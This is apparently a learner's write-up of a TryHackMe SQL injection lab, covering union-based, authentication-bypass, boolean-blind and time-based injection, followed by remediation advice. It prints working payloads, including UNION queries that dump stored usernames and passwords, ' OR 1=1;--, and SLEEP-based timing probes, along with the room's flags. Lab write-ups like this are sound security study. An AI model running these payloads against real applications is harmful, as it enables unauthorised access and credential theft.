# SQL Injection — The Parasite

**Date:** 30.03.2026
**Platform:** TryHackMe
**Room:** sqlinjectionlm
**Difficulty:** Medium

## The Creature

A parasite doesn't break doors.
It speaks the door's language
and asks it to open willingly.
The guardian has no idea it's being controlled.

## What is SQL Injection

A web application takes user input and builds
an SQL query from it. If input is not sanitized,
an attacker can inject SQL code directly into
the query — changing its logic entirely.

The translator (web app) trusts the user too much.
It passes everything to the guardian (database)
verbatim — even commands.

## Level 1 — In-Band SQLi (Union-Based)

Results return directly on the page.
Most visible type. Easiest to exploit.

### Attack chain:

Step 1 — find number of columns:
1 UNION SELECT 1,2,3

Step 2 — identify database name:
0 UNION SELECT 1,2,database()
→ database name: sqli_one

Step 3 — list all tables:
0 UNION SELECT 1,2,group_concat(table_name)
FROM information_schema.tables
WHERE table_schema = 'sqli_one'
→ tables: article, staff_users

Step 4 — list columns in staff_users:
0 UNION SELECT 1,2,group_concat(column_name)
FROM information_schema.columns
WHERE table_name = 'staff_users'

Step 5 — dump all credentials:
0 UNION SELECT 1,2,group_concat(username,':',password
SEPARATOR '<br>') FROM staff_users

Flag: THM{SQL_INJECTION_3840}

### Key concept: information_schema
Every MySQL database has information_schema.
It's a map of the entire database structure.
Tables, columns, relationships — all visible.
Attackers use it to navigate the target database
without knowing its structure in advance.

## Level 2 — Blind SQLi (Authentication Bypass)

No results shown. But login succeeds or fails.
That binary response is enough.

Payload in password field:
' OR 1=1;--

SQL becomes:
SELECT * FROM users WHERE username=''
AND password='' OR 1=1;

1=1 is always TRUE.
The entire WHERE clause evaluates to TRUE.
Every user in the database matches.
The guardian opens for everyone.

Why 1=1? Any always-true condition works:
2=2, 'a'='a', 1=1 — all identical in logic.
1=1 is just the convention. Short. Clear.

Flag: THM{SQL_INJECTION_9581}

## Level 3 — Blind SQLi (Boolean-Based)

No data shown. Only true/false responses.
But true/false is enough to extract everything.

Method: ask yes/no questions about the data.

Does the database name start with 's'?
admin123' UNION SELECT 1,2,3
WHERE database() LIKE 's%';--
→ TRUE (page loads normally)

Does the table name start with 'u'?
→ TRUE

Is the password 'a%'? 'b%'? ... '3%'?
→ cycle through until TRUE

Result: password extracted character by character.
Slow. Methodical. Unstoppable.

Flag: THM{SQL_INJECTION_1093}

## Level 4 — Blind SQLi (Time-Based)

No visual feedback at all.
The database speaks through silence and delay.

SLEEP(5) executes only if the UNION is valid:
admin123' UNION SELECT SLEEP(5),2;--
→ 5 second delay = condition TRUE
→ instant response = condition FALSE

Reading silence like a heartbeat.
The database doesn't speak — it breathes.
You learn to read the rhythm.

Flag: THM{SQL_INJECTION_MASTER}

## The Four Faces of The Parasite

In-Band      → sees results directly on page
Auth Bypass  → exploits login logic with OR 1=1
Boolean      → reads true/false like morse code
Time-Based   → reads delay like a heartbeat

Same creature. Four different disguises.

## How to Kill The Parasite — Remediation

### Prepared Statements (most effective)
SQL structure is compiled FIRST.
User input is added AFTER — as pure data, not code.
Even ' OR 1=1;-- becomes just a string of text.
The guardian stops listening to the user's language.

### Input Validation
Allow only expected characters.
Email fields should only accept email format.
Number fields should only accept numbers.

### Escaping User Input
Prepend \ to dangerous characters: ' " $ \
They lose their special meaning.
Treated as literal text, not SQL syntax.

## What Surprised Me

I expected SQL injection to be technical and complex.
Level 2 was four characters: ' OR 1=1;--
That's it. Four characters bypassed authentication
on a login form protecting a database.

Time-based injection was the most mind-bending.
The database gives zero information.
But silence has a duration.
And duration is information.

The most dangerous insight:
information_schema exists on every MySQL database.
An attacker who finds one SQL injection point
can map the entire database structure
without any prior knowledge.
One crack. Total visibility.

## Open Questions

- How does sqlmap automate all of this?
  (next tool to learn)
- What is Second-Order SQL Injection?
- Can NoSQL databases be injected the same way?
- How do bug bounty hunters find SQLi
  on real websites efficiently?

## Tags
sql-injection, sqli, union-based, boolean-blind,
time-based, authentication-bypass, database,
information-schema, mysql, prepared-statements,
tryhackme, owasp, web-security